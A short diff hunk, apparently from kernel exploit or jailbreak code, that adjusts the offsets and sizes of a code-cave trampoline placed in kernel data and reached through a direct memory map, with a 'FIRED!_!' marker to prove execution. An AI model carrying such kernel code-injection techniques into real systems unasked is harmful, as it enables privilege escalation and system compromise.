@@ -4102,10 +4102,10 @@ ring3_fallback:
                  *   .quad 0               ; patched with DMAP addr of kdata+0x20
                  */
                 #define CAVE_TRAMP_OFFSET     0x100  /* offset within kdata_base page */
-                #define CAVE_TRAMP_TARGET_OFF 40     /* offset to g_trampoline_target */
-                #define CAVE_TRAMP_PROOF_OFF  48     /* offset to g_proof_marker_addr */
-                #define CAVE_TRAMP_CODE_SZ    40     /* bytes of executable code */
-                #define CAVE_TRAMP_TOTAL      56     /* code + 8-byte target + 8-byte proof addr */
+                #define CAVE_TRAMP_TARGET_OFF 56     /* offset to g_trampoline_target */
+                #define CAVE_TRAMP_PROOF_OFF  64     /* offset to g_proof_marker_addr */
+                #define CAVE_TRAMP_CODE_SZ    56     /* bytes of code + int3 padding */
+                #define CAVE_TRAMP_TOTAL      72     /* code + 8-byte target + 8-byte proof addr */
                 #define CAVE_PROOF_MARKER     0x4649524544215F21ULL  /* "FIRED!_!" */
                 #define CAVE_PROOF_OFFSET     0x20   /* kdata_base+0x20 = proof location */
 
